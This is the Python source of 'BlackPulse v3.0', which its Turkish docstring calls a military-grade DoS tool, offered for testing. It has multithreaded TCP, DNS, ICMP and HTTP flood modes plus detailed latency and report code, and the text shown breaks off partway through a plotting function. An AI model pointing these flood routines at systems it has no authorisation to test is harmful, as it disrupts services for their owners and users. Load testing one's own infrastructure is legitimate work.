#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BlackPulse v3.0 - Askeri sınıf Dos araçı test ve eğitim amaçlı kodlanmıştır

UYARI: Bu araç yalnızca eğitim amaçlı ve sahip olduğunuz sistemlerde kullanılmalıdır.
Başkalarının sistemlerine karşı kullanılması yasal sorunlara yol açabilir.
"""

import socket
import threading
import time
import sys
import os
import json
import ssl
import random
import string
import subprocess
import platform
import psutil
import asyncio
import aiohttp
import scapy.all as scapy
from statistics import mean, median, stdev
from datetime import datetime, timedelta
from collections import deque, defaultdict
import ipaddress
import dns.resolver
import requests
from urllib.parse import urlparse
import concurrent.futures
import hashlib
import base64
import struct
import argparse
import yaml
from pathlib import Path
import logging
import queue
import signal
import csv
from typing import Dict, List, Optional, Tuple, Any
try:
    import matplotlib.pyplot as plt
    import numpy as np
    MATPLOTLIB_AVAILABLE = True
except ImportError:
    MATPLOTLIB_AVAILABLE = False
    
try:
    from tabulate import tabulate
    TABULATE_AVAILABLE = True
except ImportError:
    TABULATE_AVAILABLE = False

# ========== RENKLER VE TEMA ==========
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'  
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    # Gradient colors
    NEON_GREEN = '\033[38;5;46m'
    NEON_BLUE = '\033[38;5;39m'
    NEON_PURPLE = '\033[38;5;135m'
    NEON_RED = '\033[38;5;196m'
    DARK_GRAY = '\033[38;5;240m'
    GOLD = '\033[38;5;220m'
    ORANGE = '\033[38;5;208m'

# ========== LOGGING SİSTEMİ ==========
def setup_logging():
    """Gelişmiş logging sistemi"""
    log_dir = Path("logs")
    log_dir.mkdir(exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = log_dir / f"blackpulse_{timestamp}.log"
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)

# ========== BANNER VE UI ==========
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""{Colors.NEON_PURPLE}
    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██████╗ ██╗   ██╗██╗     ███████╗███████╗
    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██║   ██║██║     ██╔════╝██╔════╝
    ██████╔╝██║     ███████║██║     █████╔╝ ██████╔╝██║   ██║██║     ███████╗█████╗  
    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔═══╝ ██║   ██║██║     ╚════██║██╔══╝  
    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝███████╗███████║███████╗
    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝
    {Colors.ENDC}
    {Colors.NEON_BLUE}╔════════════════════════════════════════════════════════════════════════╗
    ║                    Advanced Network Testing Suite v3.0                ║
    ║                Professional Grade Performance Testing Tool             ║
    ╚════════════════════════════════════════════════════════════════════════╝{Colors.ENDC}
    
    {Colors.NEON_GREEN}[⚡] Author: kodclub
    [⚡] Version: 3.0 Professional Edition  
    [⚡] Features: Multi-Protocol, Real-time Analytics, Advanced Reporting
    [⚡] Protocols: TCP, UDP, HTTP/HTTPS, WebSocket, DNS, ICMP{Colors.ENDC}
    
    {Colors.WARNING}⚠️  YASAL UYARI: Bu araç yalnızca sahip olduğunuz sistemlerde test amaçlı kullanın!{Colors.ENDC}
    """
    print(banner)

def print_separator(char="═", length=80, color=Colors.NEON_BLUE):
    print(f"{color}{char * length}{Colors.ENDC}")

def print_section_header(title, color=Colors.NEON_PURPLE):
    print_separator("═", 80, color)
    print(f"{color}{Colors.BOLD}{title:^80}{Colors.ENDC}")
    print_separator("═", 80, color)

# ========== GELİŞMİŞ METRİKLER ==========
class AdvancedMetrics:
    def __init__(self):
        self.lock = threading.Lock()
        self.success_count = 0
        self.fail_count = 0
        self.timeout_count = 0
        self.connection_refused = 0
        self.latencies = deque(maxlen=10000)  # Memory efficient
        self.response_sizes = deque(maxlen=10000)
        self.timestamps = deque(maxlen=10000)
        self.start_time = None
        self.end_time = None
        self.total_bytes_sent = 0
        self.total_bytes_received = 0
        self.connection_errors = defaultdict(int)
        self.rps_history = deque(maxlen=100)
        self.latency_history = deque(maxlen=100)
        self.bandwidth_history = deque(maxlen=100)
        self.concurrent_connections = 0
        self.max_concurrent = 0
        self.ssl_handshake_times = deque(maxlen=1000)
        self.dns_resolution_times = deque(maxlen=1000)
        
    def add_success(self, latency: float, response_size: int = 0, ssl_time: float = 0):
        with self.lock:
            self.success_count += 1
            self.latencies.append(latency)
            self.response_sizes.append(response_size)
            self.timestamps.append(time.time())
            self.total_bytes_received += response_size
            if ssl_time > 0:
                self.ssl_handshake_times.append(ssl_time)
                
    def add_failure(self, error_type: str = "unknown"):
        with self.lock:
            self.fail_count += 1
            self.connection_errors[error_type] += 1
            
    def add_timeout(self):
        with self.lock:
            self.timeout_count += 1
            
    def add_refused(self):
        with self.lock:
            self.connection_refused += 1
            
    def update_concurrent(self, delta: int):
        with self.lock:
            self.concurrent_connections += delta
            self.max_concurrent = max(self.max_concurrent, self.concurrent_connections)
            
    def get_real_time_stats(self) -> Dict[str, Any]:
        with self.lock:
            now = time.time()
            recent_window = now - 5  # Son 5 saniye
            
            # Son 5 saniyedeki başarılı istekler
            recent_successes = sum(1 for t in self.timestamps if t > recent_window)
            current_rps = recent_successes / 5.0
            
            # Son latency ortalaması
            recent_latencies = [lat for i, lat in enumerate(self.latencies) 
                             if len(self.timestamps) > i and self.timestamps[i] > recent_window]
            avg_latency = mean(recent_latencies) * 1000 if recent_latencies else 0
            
            # Bandwidth hesaplama
            recent_bytes = sum(size for i, size in enumerate(self.response_sizes)
                             if len(self.timestamps) > i and self.timestamps[i] > recent_window)
            bandwidth_mbps = (recent_bytes * 8) / (5 * 1024 * 1024)  # Mbps
            
            return {
                'rps': current_rps,
                'avg_latency_ms': avg_latency,
                'bandwidth_mbps': bandwidth_mbps,
                'success_rate': (self.success_count / (self.success_count + self.fail_count) * 100) 
                               if (self.success_count + self.fail_count) > 0 else 0,
                'concurrent': self.concurrent_connections,
                'total_success': self.success_count,
                'total_fail': self.fail_count
            }

# ========== GELIŞMIŞ HELPER FONKSIYONLAR ==========
class NetworkUtils:
    @staticmethod
    def get_system_info() -> Dict[str, Any]:
        """Sistem bilgilerini topla"""
        return {
            'platform': platform.platform(),
            'cpu_count': psutil.cpu_count(),
            'memory_gb': round(psutil.virtual_memory().total / (1024**3), 2),
            'network_interfaces': len(psutil.net_if_addrs()),
            'max_open_files': get_max_open_files()
        }
    
    @staticmethod
    def optimize_system():
        """Sistem optimizasyonu önerileri"""
        recommendations = []
        
        # Dosya descriptor limiti kontrol
        try:
            import resource
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            if soft < 65536:
                recommendations.append(f"Dosya descriptor limitini artırın: ulimit -n 65536 (mevcut: {soft})")
        except ImportError:
            pass
            
        # TCP ayarları
        if platform.system() == "Linux":
            recommendations.extend([
                "TCP ayarlarını optimize edin:",
                "  echo 'net.core.somaxconn = 65535' >> /etc/sysctl.conf",
                "  echo 'net.ipv4.tcp_max_syn_backlog = 65535' >> /etc/sysctl.conf",
                "  sysctl -p"
            ])
            
        return recommendations

    @staticmethod
    def resolve_target(target: str) -> Tuple[Optional[str], Optional[int], Dict[str, Any]]:
        """Gelişmiş hedef çözümleme"""
        resolve_info = {'dns_time': 0, 'ip_version': 4, 'cname_records': []}
        
        try:
            start_time = time.time()
            
            # URL parse
            if target.startswith(('http://', 'https://')):
                parsed = urlparse(target)
                hostname = parsed.hostname
                port = parsed.port
                if port is None:
                    port = 443 if parsed.scheme == 'https' else 80
            else:
                if ':' in target and not target.count(':') > 1:  # IPv4:port
                    hostname, port_str = target.rsplit(':', 1)
                    port = int(port_str)
                else:
                    hostname = target
                    port = 80
                    
            # IP kontrolü
            try:
                ip_obj = ipaddress.ip_address(hostname)
                resolve_info['ip_version'] = ip_obj.version
                resolve_info['dns_time'] = time.time() - start_time
                return str(ip_obj), port, resolve_info
            except ValueError:
                pass
                
            # DNS çözümleme - detaylı
            try:
                # A kaydı
                result = dns.resolver.resolve(hostname, 'A')
                ip = str(result[0])
                resolve_info['dns_time'] = time.time() - start_time
                
                # CNAME kontrol
                try:
                    cname_result = dns.resolver.resolve(hostname, 'CNAME')
                    resolve_info['cname_records'] = [str(r) for r in cname_result]
                except:
                    pass
                    
                print(f"{Colors.OKGREEN}[✓] DNS çözümlendi: {hostname} -> {ip} ({resolve_info['dns_time']*1000:.1f}ms){Colors.ENDC}")
                return ip, port, resolve_info
                
            except Exception as e:
                print(f"{Colors.FAIL}[✗] DNS çözümlenemedi: {e}{Colors.ENDC}")
                return None, None, resolve_info
                
        except Exception as e:
            print(f"{Colors.FAIL}[✗] Hedef çözümlenemedi: {e}{Colors.ENDC}")
            return None, None, resolve_info

def get_max_open_files() -> int:
    """Maksimum açık dosya sayısını al"""
    try:
        import resource
        return resource.getrlimit(resource.RLIMIT_NOFILE)[0]
    except:
        return 1024

# ========== GELİŞMİŞ TEST MODları ==========
class AdvancedTestModes:
    @staticmethod
    async def async_http_test(session, url: str, metrics: AdvancedMetrics, headers: Dict[str, str]):
        """Asenkron HTTP testi"""
        try:
            metrics.update_concurrent(1)
            start_time = time.time()
            
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                content = await response.read()
                latency = time.time() - start_time
                metrics.add_success(latency, len(content))
                
        except asyncio.TimeoutError:
            metrics.add_timeout()
        except aiohttp.ClientConnectorError:
            metrics.add_refused()
        except Exception as e:
            metrics.add_failure(str(type(e).__name__))
        finally:
            metrics.update_concurrent(-1)
    
    @staticmethod
    def tcp_flood_advanced(target_ip: str, target_port: int, duration: int, metrics: AdvancedMetrics, config: Dict[str, Any]):
        """Gelişmiş TCP flood testi"""
        end_time = time.time() + duration
        socket_pool = []
        
        # Socket pool oluştur
        for _ in range(config.get('socket_pool_size', 10)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                socket_pool.append(s)
            except:
                pass
        
        while time.time() < end_time:
            for sock in socket_pool:
                try:
                    metrics.update_concurrent(1)
                    start_time = time.time()
                    
                    sock.settimeout(config.get('timeout', 3))
                    sock.connect((target_ip, target_port))
                    
                    # Veri gönder
                    if config.get('send_data', False):
                        data = generate_random_data(config.get('data_size', 1024))
                        sock.sendall(data)
                        metrics.total_bytes_sent += len(data)
                    
                    # Yanıt bekle
                    if config.get('wait_response', False):
                        response = sock.recv(4096)
                        metrics.total_bytes_received += len(response)
                    
                    sock.close()
                    
                    latency = time.time() - start_time
                    metrics.add_success(latency)
                    
                except socket.timeout:
                    metrics.add_timeout()
                except ConnectionRefusedError:
                    metrics.add_refused()
                except Exception as e:
                    metrics.add_failure(str(type(e).__name__))
                finally:
                    metrics.update_concurrent(-1)
                    
                if time.time() >= end_time:
                    break
        
        # Socket pool temizle
        for sock in socket_pool:
            try:
                sock.close()
            except:
                pass

    @staticmethod
    async def websocket_test(target_ip: str, target_port: int, duration: int, metrics: AdvancedMetrics):
        """WebSocket testi"""
        import websockets
        
        uri = f"ws://{target_ip}:{target_port}"
        end_time = time.time() + duration
        
        try:
            async with websockets.connect(uri, timeout=10) as websocket:
                while time.time() < end_time:
                    try:
                        start_time = time.time()
                        await websocket.send("ping")
                        response = await websocket.recv()
                        latency = time.time() - start_time
                        metrics.add_success(latency, len(response))
                        await asyncio.sleep(0.1)
                    except Exception as e:
                        metrics.add_failure(str(type(e).__name__))
                        break
        except Exception as e:
            metrics.add_failure(f"WebSocket_{type(e).__name__}")

    @staticmethod
    def dns_flood_test(target_domain: str, duration: int, metrics: AdvancedMetrics, dns_servers: List[str]):
        """DNS flood testi"""
        end_time = time.time() + duration
        resolver = dns.resolver.Resolver()
        
        while time.time() < end_time:
            for dns_server in dns_servers:
                try:
                    resolver.nameservers = [dns_server]
                    start_time = time.time()
                    
                    result = resolver.resolve(target_domain, 'A')
                    latency = time.time() - start_time
                    
                    metrics.add_success(latency)
                    metrics.dns_resolution_times.append(latency)
                    
                except dns.resolver.NXDOMAIN:
                    metrics.add_failure("NXDOMAIN")
                except dns.resolver.Timeout:
                    metrics.add_timeout()
                except Exception as e:
                    metrics.add_failure(str(type(e).__name__))

    @staticmethod
    def icmp_ping_test(target_ip: str, duration: int, metrics: AdvancedMetrics, config: Dict[str, Any]):
        """ICMP ping testi (root gerektirir)"""
        end_time = time.time() + duration
        packet_size = config.get('packet_size', 64)
        
        if os.geteuid() != 0:  # Root kontrolü
            print(f"{Colors.WARNING}[!] ICMP testi için root yetkileri gerekli{Colors.ENDC}")
            return
            
        while time.time() < end_time:
            try:
                # Scapy ile ICMP paketi oluştur
                packet = scapy.IP(dst=target_ip)/scapy.ICMP()/('X' * packet_size)
                start_time = time.time()
                
                response = scapy.sr1(packet, timeout=config.get('timeout', 3), verbose=0)
                
                if response:
                    latency = time.time() - start_time
                    metrics.add_success(latency, len(response))
                else:
                    metrics.add_timeout()
                    
            except Exception as e:
                metrics.add_failure(str(type(e).__name__))

def generate_random_data(size: int = 1024, data_type: str = "random") -> bytes:
    """Gelişmiş veri üretici"""
    if data_type == "random":
        return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()
    elif data_type == "zeros":
        return b'\x00' * size
    elif data_type == "pattern":
        pattern = b'ABCD' * (size // 4) + b'ABCD'[:size % 4]
        return pattern
    else:
        return os.urandom(size)

# ========== GELİŞMİŞ MONİTORİNG ==========
class RealTimeMonitor:
    def __init__(self, metrics: AdvancedMetrics, duration: int):
        self.metrics = metrics
        self.duration = duration
        self.running = True
        self.stats_queue = queue.Queue()
        
    def start_monitoring(self):
        """Gerçek zamanlı izleme başlat"""
        monitor_thread = threading.Thread(target=self._monitor_loop)
        monitor_thread.daemon = True
        monitor_thread.start()
        return monitor_thread
        
    def _monitor_loop(self):
        """İzleme döngüsü"""
        start_time = time.time()
        last_update = start_time
        
        while self.running and (time.time() - start_time) < self.duration:
            current_time = time.time()
            elapsed = current_time - start_time
            remaining = self.duration - elapsed
            
            # Stats güncelle
            stats = self.metrics.get_real_time_stats()
            
            # Progress bar
            progress = elapsed / self.duration
            bar_length = 50
            filled_length = int(bar_length * progress)
            bar = '█' * filled_length + '░' * (bar_length - filled_length)
            
            # CPU ve Memory kullanımı
            cpu_percent = psutil.cpu_percent(interval=None)
            memory_percent = psutil.virtual_memory().percent
            
            # Görsel güncelleme
            status_line = (
                f"\r{Colors.NEON_BLUE}[{bar}] {progress*100:.1f}% | "
                f"{Colors.NEON_GREEN}✓{stats['total_success']:,} "
                f"{Colors.NEON_RED}✗{stats['total_fail']:,} "
                f"{Colors.NEON_PURPLE}⚡{stats['rps']:.1f}req/s "
                f"{Colors.WARNING}📊{stats['success_rate']:.1f}% "
                f"{Colors.OKCYAN}⏱{stats['avg_latency_ms']:.1f}ms "
                f"{Colors.GOLD}🌐{stats['bandwidth_mbps']:.2f}Mbps "
                f"{Colors.ORANGE}🔗{stats['concurrent']} "
                f"{Colors.DARK_GRAY}💻{cpu_percent:.1f}% "
                f"🧠{memory_percent:.1f}% "
                f"⏳{int(remaining)}s{Colors.ENDC}"
            )
            
            print(status_line, end='', flush=True)
            
            # Stats kaydet
            self.stats_queue.put({
                'timestamp': current_time,
                'stats': stats.copy(),
                'system': {'cpu': cpu_percent, 'memory': memory_percent}
            })
            
            time.sleep(1)
            
    def stop_monitoring(self):
        """İzlemeyi durdur"""
        self.running = False
        
    def get_historical_data(self) -> List[Dict[str, Any]]:
        """Geçmiş verileri al"""
        data = []
        while not self.stats_queue.empty():
            try:
                data.append(self.stats_queue.get_nowait())
            except queue.Empty:
                break
        return data

# ========== GELİŞMİŞ RAPOR SİSTEMİ ==========
class AdvancedReportGenerator:
    def __init__(self, metrics: AdvancedMetrics, target_info: Dict[str, Any], test_config: Dict[str, Any]):
        self.metrics = metrics
        self.target_info = target_info
        self.test_config = test_config
        
    def generate_console_report(self):
        """Konsol raporu oluştur"""
        print_section_header("BLACKPULSE v3.0 DETAYLI TEST RAPORU", Colors.NEON_PURPLE)
        
        # Test Özeti
        self._print_test_summary()
        
        # Performans Metrikleri
        self._print_performance_metrics()
        
        # Latency Analizi
        self._print_latency_analysis()
        
        # Bağlantı Analizi
        self._print_connection_analysis()
        
        # Sistem Kaynak Kullanımı
        self._print_system_usage()
        
        # Hata Analizi
        self._print_error_analysis()
        
        # Öneriler
        self._print_recommendations()
        
        print_separator("═", 80, Colors.NEON_BLUE)
        
    def _print_test_summary(self):
        """Test özeti"""
        print(f"\n{Colors.BOLD}📋 TEST DETAYLARI:{Colors.ENDC}")
        
        summary_data = [
            ["🎯 Hedef", f"{self.target_info['ip']}:{self.target_info['port']}"],
            ["🔧 Test Tipi", self.test_config['mode']],
            ["🧵 Thread Sayısı", f"{self.test_config['threads']:,}"],
            ["⏱️ Test Süresi", f"{self.test_config['duration']} saniye"],
            ["🕐 Başlangıç", datetime.fromtimestamp(self.metrics.start_time).strftime('%Y-%m-%d %H:%M:%S')],
            ["🏁 Bitiş", datetime.fromtimestamp(self.metrics.end_time).strftime('%Y-%m-%d %H:%M:%S')],
            ["🌍 DNS Çözümleme", f"{self.target_info.get('resolve_info', {}).get('dns_time', 0)*1000:.1f}ms"]
        ]
        
        print(tabulate(summary_data, tablefmt="fancy_grid", colalign=("left", "left")) if TABULATE_AVAILABLE 
              else "\n".join([f"{row[0]}: {row[1]}" for row in summary_data]))
        
    def _print_performance_metrics(self):
        """Performans metrikleri"""
        print(f"\n{Colors.BOLD}⚡ PERFORMANS METRİKLERİ:{Colors.ENDC}")
        
        total_requests = self.metrics.success_count + self.metrics.fail_count
        success_rate = (self.metrics.success_count / total_requests * 100) if total_requests > 0 else 0
        avg_rps = self.metrics.success_count / self.test_config['duration']
        
        perf_data = [
            ["✅ Başarılı İstek", f"{self.metrics.success_count:,}", "yeşil"],
            ["❌ Başarısız İstek", f"{self.metrics.fail_count:,}", "kırmızı"],
            ["⏰ Timeout", f"{self.metrics.timeout_count:,}", "sarı"],
            ["🚫 Connection Refused", f"{self.metrics.connection_refused:,}", "kırmızı"],
            ["📊 Başarı Oranı", f"{success_rate:.2f}%", "mavi"],
            ["🚀 Ortalama RPS", f"{avg_rps:.2f}", "mor"],
            ["🔗 Max Eşzamanlı", f"{self.metrics.max_concurrent:,}", "turuncu"],
            ["📤 Gönderilen Veri", f"{self.metrics.total_bytes_sent / (1024*1024):.2f} MB", "mavi"],
            ["📥 Alınan Veri", f"{self.metrics.total_bytes_received / (1024*1024):.2f} MB", "yeşil"]
        ]
        
        print(tabulate([[row[0], row[1]] for row in perf_data], 
                      tablefmt="fancy_grid", colalign=("left", "right")) if TABULATE_AVAILABLE
              else "\n".join([f"{row[0]}: {row[1]}" for row in perf_data]))
                      
    def _print_latency_analysis(self):
        """Latency analizi"""
        if not self.metrics.latencies:
            return
            
        print(f"\n{Colors.BOLD}⏱️ LATENCY ANALİZİ:{Colors.ENDC}")
        
        latencies_ms = [l * 1000 for l in self.metrics.latencies]
        sorted_latencies = sorted(latencies_ms)
        
        # Percentile hesaplamaları
        percentiles = [50, 75, 90, 95, 99, 99.9]
        latency_data = [
            ["📊 Ortalama", f"{mean(latencies_ms):.2f} ms"],
            ["📈 Medyan", f"{median(latencies_ms):.2f} ms"],
            ["⬇️ En Düşük", f"{min(latencies_ms):.2f} ms"],
            ["⬆️ En Yüksek", f"{max(latencies_ms):.2f} ms"],
            ["📏 Std Sapma", f"{stdev(latencies_ms):.2f} ms" if len(latencies_ms) > 1 else "N/A"]
        ]
        
        # Percentile ekle
        for p in percentiles:
            idx = int(len(sorted_latencies) * p / 100) - 1
            if idx >= 0:
                latency_data.append([f"🎯 P{p}", f"{sorted_latencies[idx]:.2f} ms"])
                
        print(tabulate(latency_data, tablefmt="fancy_grid", colalign=("left", "right")) if TABULATE_AVAILABLE
              else "\n".join([f"{row[0]}: {row[1]}" for row in latency_data]))
        
        # Latency dağılımı
        self._print_latency_distribution(latencies_ms)
        
    def _print_latency_distribution(self, latencies_ms: List[float]):
        """Latency dağılımı göster"""
        print(f"\n{Colors.BOLD}📈 LATENCY DAĞILIMI:{Colors.ENDC}")
        
        # Histogram oluştur
        bins = [0, 10, 50, 100, 500, 1000, 5000, float('inf')]
        labels = ["<10ms", "10-50ms", "50-100ms", "100-500ms", "500ms-1s", "1-5s", ">5s"]
        
        distribution = [0] * len(labels)
        for latency in latencies_ms:
            for i, bin_max in enumerate(bins[1:]):
                if latency < bin_max:
                    distribution[i] += 1
                    break
        
        total = sum(distribution)
        dist_data = []
        for i, (label, count) in enumerate(zip(labels, distribution)):
            percentage = (count / total * 100) if total > 0 else 0
            bar = "█" * int(percentage / 2)  # Scale down for display
            dist_data.append([label, f"{count:,}", f"{percentage:.1f}%", bar])
            
        print(tabulate(dist_data, 
                      headers=["Aralık", "Sayı", "Yüzde", "Grafik"],
                      tablefmt="fancy_grid") if TABULATE_AVAILABLE
              else "\n".join([f"{row[0]}: {row[1]} ({row[2]}) {row[3]}" for row in dist_data]))
        
    def _print_connection_analysis(self):
        """Bağlantı analizi"""
        print(f"\n{Colors.BOLD}🔗 BAĞLANTI ANALİZİ:{Colors.ENDC}")
        
        conn_data = [
            ["🔗 Max Eşzamanlı", f"{self.metrics.max_concurrent:,}"],
            ["⚡ Ortalama Eşzamanlı", f"{self.metrics.max_concurrent/2:.1f}"],  # Rough estimate
            ["🔄 Toplam Bağlantı", f"{self.metrics.success_count + self.metrics.fail_count:,}"],
            ["✅ Başarılı Bağlantı", f"{self.metrics.success_count:,}"],
            ["❌ Başarısız Bağlantı", f"{self.metrics.fail_count:,}"]
        ]
        
        if self.metrics.ssl_handshake_times:
            avg_ssl = mean(self.metrics.ssl_handshake_times) * 1000
            conn_data.append(["🔒 Ort. SSL Handshake", f"{avg_ssl:.2f} ms"])
            
        if self.metrics.dns_resolution_times:
            avg_dns = mean(self.metrics.dns_resolution_times) * 1000
            conn_data.append(["🌐 Ort. DNS Çözümleme", f"{avg_dns:.2f} ms"])
            
        print(tabulate(conn_data, tablefmt="fancy_grid", colalign=("left", "right")) if TABULATE_AVAILABLE
              else "\n".join([f"{row[0]}: {row[1]}" for row in conn_data]))
        
    def _print_system_usage(self):
        """Sistem kaynak kullanımı"""
        print(f"\n{Colors.BOLD}💻 SİSTEM KAYNAK KULLANIMI:{Colors.ENDC}")
        
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk_io = psutil.disk_io_counters()
            net_io = psutil.net_io_counters()
            
            system_data = [
                ["🖥️ CPU Kullanımı", f"{cpu_percent:.1f}%"],
                ["🧠 RAM Kullanımı", f"{memory.percent:.1f}%"],
                ["💾 RAM Kullanılan", f"{memory.used / (1024**3):.2f} GB"],
                ["💽 Disk Okuma", f"{disk_io.read_bytes / (1024**2):.2f} MB"],
                ["💿 Disk Yazma", f"{disk_io.write_bytes / (1024**2):.2f} MB"],
                ["📡 Ağ Gönderilen", f"{net_io.bytes_sent / (1024**2):.2f} MB"],
                ["📡 Ağ Alınan", f"{net_io.bytes_recv / (1024**2):.2f} MB"],
                ["📁 Açık Dosya", f"{len(psutil.pids())} (≈)"]
            ]
            
            print(tabulate(system_data, tablefmt="fancy_grid", colalign=("left", "right")) if TABULATE_AVAILABLE
                  else "\n".join([f"{row[0]}: {row[1]}" for row in system_data]))
            
        except Exception as e:
            print(f"{Colors.WARNING}[!] Sistem bilgileri alınamadı: {e}{Colors.ENDC}")
            
    def _print_error_analysis(self):
        """Hata analizi"""
        if not self.metrics.connection_errors:
            return
            
        print(f"\n{Colors.BOLD}🔍 HATA ANALİZİ:{Colors.ENDC}")
        
        total_errors = sum(self.metrics.connection_errors.values())
        error_data = []
        
        for error_type, count in sorted(self.metrics.connection_errors.items(), 
                                       key=lambda x: x[1], reverse=True):
            percentage = (count / total_errors * 100) if total_errors > 0 else 0
            error_data.append([f"❌ {error_type}", f"{count:,}", f"{percentage:.1f}%"])
            
        print(tabulate(error_data, 
                      headers=["Hata Tipi", "Sayı", "Yüzde"],
                      tablefmt="fancy_grid") if TABULATE_AVAILABLE
              else "\n".join([f"{row[0]}: {row[1]} ({row[2]})" for row in error_data]))
                      
    def _print_recommendations(self):
        """Öneriler"""
        print(f"\n{Colors.BOLD}💡 OPTİMİZASYON ÖNERİLERİ:{Colors.ENDC}")
        
        recommendations = []
        
        # Başarı oranına göre öneriler
        total_requests = self.metrics.success_count + self.metrics.fail_count
        success_rate = (self.metrics.success_count / total_requests * 100) if total_requests > 0 else 0
        
        if success_rate < 50:
            recommendations.append("🔴 Düşük başarı oranı - hedef sistemin kapasitesini kontrol edin")
        elif success_rate < 80:
            recommendations.append("🟡 Orta başarı oranı - thread sayısını azaltmayı deneyin")
        else:
            recommendations.append("🟢 Yüksek başarı oranı - test başarılı")
            
        # Latency önerileri
        if self.metrics.latencies:
            avg_latency = mean(self.metrics.latencies) * 1000
            if avg_latency > 1000:
                recommendations.append("🔴 Yüksek latency - ağ bağlantısını kontrol edin")
            elif avg_latency > 500:
                recommendations.append("🟡 Orta latency - hedef sistem yükünü kontrol edin")
                
        # Timeout önerileri
        if self.metrics.timeout_count > total_requests * 0.1:
            recommendations.append("⏰ Yüksek timeout oranı - timeout değerini artırın")
            
        # Sistem önerileri
        try:
            if psutil.cpu_percent() > 80:
                recommendations.append("💻 Yüksek CPU kullanımı - thread sayısını azaltın")
            if psutil.virtual_memory().percent > 80:
                recommendations.append("🧠 Yüksek RAM kullanımı - bellek sızıntısı kontrolü")
        except:
            pass
            
        # Genel öneriler
        recommendations.extend([
            "🔧 Sistem limitlerini kontrol edin: ulimit -n",
            "⚙️ TCP ayarlarını optimize edin",
            "📊 Sonuçları JSON formatında kaydedin",
            "📈 Grafik raporları için matplotlib kullanın"
        ])
        
        for i, rec in enumerate(recommendations, 1):
            print(f"  {i:2d}. {rec}")
            
    def save_json_report(self, filename: str):
        """JSON rapor kaydet"""
        report_data = {
            "metadata": {
                "version": "3.0",
                "generated_at": datetime.now().isoformat(),
                "duration_seconds": self.test_config['duration']
            },
            "test_config": self.test_config,
            "target_info": self.target_info,
            "metrics": {
                "requests": {
                    "total": self.metrics.success_count + self.metrics.fail_count,
                    "successful": self.metrics.success_count,
                    "failed": self.metrics.fail_count,
                    "timeouts": self.metrics.timeout_count,
                    "refused": self.metrics.connection_refused,
                    "success_rate_percent": (self.metrics.success_count / (self.metrics.success_count + self.metrics.fail_count) * 100) if (self.metrics.success_count + self.metrics.fail_count) > 0 else 0
                },
                "performance": {
                    "average_rps": self.metrics.success_count / self.test_config['duration'],
                    "max_concurrent_connections": self.metrics.max_concurrent,
                    "total_bytes_sent": self.metrics.total_bytes_sent,
                    "total_bytes_received": self.metrics.total_bytes_received
                },
                "latency": {
                    "average_ms": mean(self.metrics.latencies) * 1000 if self.metrics.latencies else 0,
                    "median_ms": median(self.metrics.latencies) * 1000 if self.metrics.latencies else 0,
                    "min_ms": min(self.metrics.latencies) * 1000 if self.metrics.latencies else 0,
                    "max_ms": max(self.metrics.latencies) * 1000 if self.metrics.latencies else 0,
                    "std_dev_ms": stdev(self.metrics.latencies) * 1000 if len(self.metrics.latencies) > 1 else 0,
                    "percentiles": self._calculate_percentiles()
                },
                "errors": dict(self.metrics.connection_errors)
            },
            "system_info": NetworkUtils.get_system_info()
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
            
        print(f"{Colors.NEON_GREEN}[✓] JSON rapor kaydedildi: {filename}{Colors.ENDC}")
        
    def save_csv_report(self, filename: str):
        """CSV rapor kaydet"""
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            
            # Header
            writer.writerow(['Timestamp', 'Latency_ms', 'Response_Size', 'Success'])
            
            # Data
            for i, latency in enumerate(self.metrics.latencies):
                timestamp = self.metrics.timestamps[i] if i < len(self.metrics.timestamps) else time.time()
                response_size = self.metrics.response_sizes[i] if i < len(self.metrics.response_sizes) else 0
                writer.writerow([timestamp, latency * 1000, response_size, 1])
                
        print(f"{Colors.NEON_GREEN}[✓] CSV rapor kaydedildi: {filename}{Colors.ENDC}")
        
    def generate_graph_report(self, filename: str):
        """Grafik rapor oluştur"""
        if not self.metrics.latencies:
            print(f"{Colors.WARNING}[!] Grafik için yeterli veri yok{Colors.ENDC}")
            return
            
        if not MATPLOTLIB_AVAILABLE:
            print(f"{Colors.WARNING}[!] Grafik için matplotlib gerekli: pip install matplotlib numpy{Colors.ENDC}")
            return
            
        try:
            fig, ((ax1, ax2), (ax3, ax4)) = plt.subplots(2, 2, figsize=(15, 10))
            fig.suptitle('BlackPulse v3.0 - Test Sonuçları', fontsize=16)
            
            # Latency grafiği
            latencies_ms = [l * 1000 for l in list(self.metrics.latencies)]
            ax1.plot(latencies_ms, color='blue', alpha=0.7)
            ax1.set_title('Latency Değişimi (ms)')
            ax1.set_xlabel('İstek Sırası')
            ax1.set_ylabel('Latency (ms)')
            ax1.grid(True, alpha=0.3)
            
            # Latency histogram
            ax2.hist(latencies_ms, bins=50, color='green', alpha=0.7, edgecolor='black')
            ax2.set_title('Latency Dağılımı')
            ax2.set_xlabel('Latency (ms)')
